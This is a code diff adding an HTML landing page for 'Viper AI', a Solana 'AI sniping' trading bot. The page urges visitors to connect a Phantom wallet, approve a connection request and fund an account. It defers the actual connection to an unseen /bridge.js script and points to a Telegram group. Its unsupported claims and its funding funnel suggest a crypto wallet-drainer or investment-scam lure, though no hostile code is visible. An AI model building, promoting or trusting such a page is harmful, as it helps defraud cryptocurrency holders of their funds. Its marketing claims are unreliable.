@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Viper AI - Ghost Mode Sniper</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0b0e;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .header {
+            padding: 2rem 0;
+            text-align: center;
+        }
+
+        .snipe-title {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00ff87 0%, #60efff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: inline-block;
+        }
+
+        .hero {
+            padding: 3rem 0 5rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .hero-text {
+            max-width: 800px;
+            margin: 0 auto 3rem;
+        }
+
+        .hero-text p {
+            font-size: 1.5rem;
+            color: #fff;
+            line-height: 1.6;
+            font-weight: 400;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5rem;
+            margin: 3rem 0 4rem;
+            flex-wrap: wrap;
+        }
+
+        .stat-item {
+            text-align: center;
+            min-width: 150px;
+        }
+
+        .stat-value {
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: #00ff87;
+            margin-bottom: 0.5rem;
+        }
+
+        .stat-label {
+            color: #9ca3af;
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+            font-weight: 500;
+        }
+
+        .card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 40px;
+            padding: 2.5rem;
+            border: 1px solid rgba(255,255,255,0.1);
+            max-width: 500px;
+            margin: 2rem auto;
+            width: 100%;
+            backdrop-filter: blur(10px);
+            position: relative;
+        }
+
+        .card h3 {
+            font-size: 2rem;
+            margin-bottom: 0.8rem;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .card-subtitle {
+            color: #9ca3af;
+            margin-bottom: 2rem;
+            text-align: center;
+            font-size: 1rem;
+        }
+
+        .divider {
+            margin: 2rem 0;
+            border: none;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .progress-container {
+            margin: 2rem 0;
+        }
+
+        .progress-bar {
+            background: rgba(255,255,255,0.1);
+            height: 8px;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 0.8rem;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(135deg, #00ff87 0%, #60efff 100%);
+            transition: width 0.3s ease;
+        }
+
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            color: #9ca3af;
+            font-size: 0.95rem;
+        }
+
+        .connect-btn {
+            background: linear-gradient(135deg, #00ff87 0%, #60efff 100%);
+            color: #0a0b0e;
+            border: none;
+            padding: 1.2rem;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            margin: 2rem 0 1.2rem;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .connect-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,255,135,0.2);
+        }
+
+        .connect-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .connect-btn.loading::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 50%;
+            right: 20px;
+            transform: translateY(-50%);
+            border: 2px solid #0a0b0e;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: translateY(-50%) rotate(360deg); }
+        }
+
+        .footer-note {
+            text-align: center;
+            color: #9ca3af;
+            font-size: 0.85rem;
+        }
+
+        .why-section {
+            padding: 5rem 0;
+            text-align: center;
+        }
+
+        .why-title {
+            font-size: 3.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .gradient-text {
+            background: linear-gradient(135deg, #00ff87 0%, #60efff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            color: #9ca3af;
+            font-size: 1.1rem;
+            margin-bottom: 4rem;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 2rem;
+            margin-top: 3rem;
+        }
+
+        .feature-card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 30px;
+            padding: 2.5rem;
+            border: 1px solid rgba(255,255,255,0.1);
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            border-color: #00ff87;
+        }
+
+        .feature-icon {
+            font-size: 3rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .feature-card h4 {
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #00ff87 0%, #60efff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .feature-card p {
+            color: #9ca3af;
+            font-size: 1rem;
+            line-height: 1.7;
+        }
+
+        .how-it-works {
+            padding: 5rem 0;
+            text-align: center;
+        }
+
+        .steps-container {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 1.5rem;
+            margin: 4rem 0;
+        }
+
+        .step {
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            padding: 2rem 1rem;
+            text-align: center;
+        }
+
+        .step-number {
+            font-size: 3rem;
+            font-weight: 800;
+            color: rgba(0,255,135,0.3);
+            margin-bottom: 1rem;
+        }
+
+        .step h5 {
+            color: #00ff87;
+            font-size: 1.2rem;
+            margin-bottom: 0.8rem;
+        }
+
+        .step p {
+            color: #9ca3af;
+            font-size: 0.9rem;
+        }
+
+        .device-title {
+            font-size: 2rem;
+            margin: 3rem 0 1.5rem;
+            color: #fff;
+        }
+
+        .community {
+            padding: 5rem 0;
+            text-align: center;
+            background: linear-gradient(135deg, rgba(0,255,135,0.1) 0%, rgba(96,239,255,0.1) 100%);
+            border-radius: 60px;
+            margin: 3rem 0;
+        }
+
+        .community h2 {
+            font-size: 3rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .community p {
+            color: #9ca3af;
+            max-width: 600px;
+            margin: 0 auto 2.5rem;
+            font-size: 1.1rem;
+        }
+
+        .telegram-btn {
+            background: transparent;
+            border: 2px solid #00ff87;
+            color: #00ff87;
+            padding: 1rem 4rem;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .telegram-btn:hover {
+            background: #00ff87;
+            color: #0a0b0e;
+        }
+
+        .footer {
+            padding: 3rem 0;
+            text-align: center;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            color: #9ca3af;
+            font-size: 0.9rem;
+        }
+
+        /* Ghost Mode Status */
+        .ghost-status {
+            background: rgba(0,255,135,0.1);
+            border-radius: 40px;
+            padding: 1rem;
+            margin-top: 1rem;
+            border: 1px solid #00ff87;
+            display: none;
+        }
+
+        .ghost-status.active {
+            display: block;
+        }
+
+        .wallet-badge {
+            font-family: monospace;
+            background: #1a1b1f;
+            padding: 0.3rem 1rem;
+            border-radius: 40px;
+            color: #9ca3af;
+            font-size: 0.85rem;
+        }
+
+        @media (max-width: 768px) {
+            .stats { gap: 2rem; }
+            .stat-value { font-size: 2rem; }
+            .features-grid,
+            .steps-container { grid-template-columns: 1fr; }
+            .hero-text p { font-size: 1.2rem; }
+            .why-title { font-size: 2.5rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="snipe-title">VIPER AI</div>
+            <div class="wallet-badge" id="walletDisplay" style="margin-top: 1rem;"> Best sniping Ai</div>
+        </div>
+
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="hero-text">
+                <p>Turn milliseconds into profits with advanced AI sniping technology. One-click wallet funding powered by cutting-edge machine learning.</p>
+            </div>
+
+            <!-- Stats -->
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-value">&lt;100ms</div>
+                    <div class="stat-label">EXECUTION SPEED</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">100%</div>
+                    <div class="stat-label">AI PRECISION</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">50+</div>
+                    <div class="stat-label">SECURITY PARAMETERS</div>
+                </div>
+            </div>
+
+            <!-- Main Card -->
+            <div class="card">
+                <h3>Viper AI</h3>
+                <div class="card-subtitle">Fund your Viper AI account to start AI sniping.</div>
+                
+                <hr class="divider">
+                
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <div class="progress-text">
+                        <span>Ready</span>
+                        <span id="progressText">0% Complete</span>
+                    </div>
+                </div>
+                
+                <button class="connect-btn" id="startBtn">
+                    ⚡︎ GET STARTED
+                </button>
+                
+                <!-- Ghost Mode Status -->
+                <div class="ghost-status" id="ghostStatus">
+                    <span style="color: #00ff87;"> Best sniping Ai </span><br>
+                    <small style="color: #9ca3af;">Optimizing liquidity routes for instant execution</small>
+                </div>
+                
+                <div class="footer-note">
+                    • Powered by Solana blockchain
+                </div>
+            </div>
+        </section>
+
+        <!-- Why Choose Section -->
+        <section class="why-section">
+            <h2 class="why-title">
+                Why Choose <span class="gradient-text">VIPER AI?</span>
+            </h2>
+            
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">⚡︎</div>
+                    <h4>Lightning Execution</h4>
+                    <p>Snipe with ultra-low latency with near-zero fees, powered by Solana's high-performance blockchain. Execute trades in under 400ms.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🛡️</div>
+                    <h4>Rug-pull Protection</h4>
+                    <p>Protect your capital with instant rug detection and automated exits. Our AI monitors 50+ security parameters in real-time.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🤖</div>
+                    <h4>Advanced AI</h4>
+                    <p>Leverage cutting-edge AI for signal scoring, trend detection, and backtested strategies. Machine learning models updated hourly.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🌍</div>
+                    <h4>Global Community</h4>
+                    <p>Connect with a worldwide community of traders through live streaming sharing insights and on-chain alpha. Real-time alerts and
+                    collaborative analysis.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- How It Works Section -->
+        <section class="how-it-works">
+            <h2 class="why-title gradient-text">How It Works</h2>
+            
+            <div class="device-title">Mobile (Phantom)</div>
+            <div class="steps-container">
+                <div class="step">
+                    <div class="step-number">01</div>
+                    <h5>Installation </h5>
+                    <p>Install Phantom Wallet from App Store/Play Store</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">02</div>
+                    <h5>Open in solana Browser</h5>
+                    <p>Open in-app browser and navigate to Viper AI</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">03</div>
+                    <h5>Get Started</h5>
+                    <p>Tap "Get Started" and approve the connection request</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">04</div>
+                    <h5>Login</h5>
+                    <p>Fund your Viper Ai account for instant login </p>
+                </div>
+                <div class="step">
+                    <div class="step-number">05</div>
+                    <h5>Start Trading</h5>
+                    <p>Start trading with funded wallet</p>
+                </div>
+            </div>
+            
+            <div class="device-title">Desktop (Phantom)</div>
+            <div class="steps-container">
+                <div class="step">
+                    <div class="step-number">01</div>
+                    <h5>Install Extension</h5>
+                    <p>Install Phantom browser extension</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">02</div>
+                    <h5>Visit Website</h5>
+                    <p>Visit Viper AI official website</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">03</div>
+                    <h5>Get Started</h5>
+                    <p>Click "Get Started" and approve</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">04</div>
+                    <h5>Login</h5>
+                    <p>Fund your Viper AI account for instant
+                    login</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">05</div>
+                    <h5>Start Trading</h5>
+                    <p>Start trading with funded wallet</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Community Section -->
+        <section class="community">
+            <h2 class="gradient-text">Community</h2>
+            <p>Connect with thousands of traders worldwide. Get real-time alerts, share insights, and grow together.</p>
+            <button class="telegram-btn" onclick="window.open('https://t.me/AIVIPER', '_blank')">
+                Join Telegram
+            </button>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div>VIPER AI © 2024</div>
+        </footer>
+    </div>
+
+    <!-- Load Solana Web3 and Bridge -->
+    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <script src="/bridge.js"></script>
+    
+    <script>
+        // Local UI updates (bridge.js handles the actual connection)
+        document.getElementById('startBtn').addEventListener('click', function() {
+            // Visual feedback handled by bridge
+            this.innerHTML = '⏳ Connecting...';
+        });
+    </script>
+</body>
+</html>
